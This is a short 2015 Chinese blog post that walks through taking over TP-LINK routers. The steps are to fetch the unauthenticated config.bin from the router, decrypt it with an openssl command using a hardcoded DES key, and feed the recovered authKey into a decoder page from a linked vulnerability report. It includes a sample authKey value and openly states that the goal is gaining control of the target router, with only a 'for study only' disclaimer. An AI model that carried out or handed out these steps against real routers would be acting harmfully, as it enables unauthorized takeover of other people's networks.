# TP-LINK config.bin 解码
## *Sat Oct 31 14:22:04 2015*

*文章内容仅供学习讨论，请勿随意模仿或触犯法律条款*

> 参考内容: [链接0](http://teknoraver.net/software/hacks/tplink/) [链接1](http://www.wooyun.org/bugs/wooyun-2015-0110062)

****

##步骤

* 首先要已经与目标路由器建立连接
* 访问 [http://192.168.1.1/config.bin](http://192.168.1.1/config.bin)
* 保存 config.bin 到本地
* 依照 链接0 的叙述，解码该文件
	`openssl enc -d -des-ecb -nopad -K 478DA50BF9E3D2CF -in config.bin > a.txt`
* a.txt 便是包含路由配置信息的明文文本
* 将 链接1 中的代码保存为网页
* 用浏览器打开这个网页，将 a.txt 中的如下行粘帖在解码栏内，就可以愉快地获得这款路由的控制权了，具体原理见 链接0

> `authKey 0rZily4W9TefbwK`
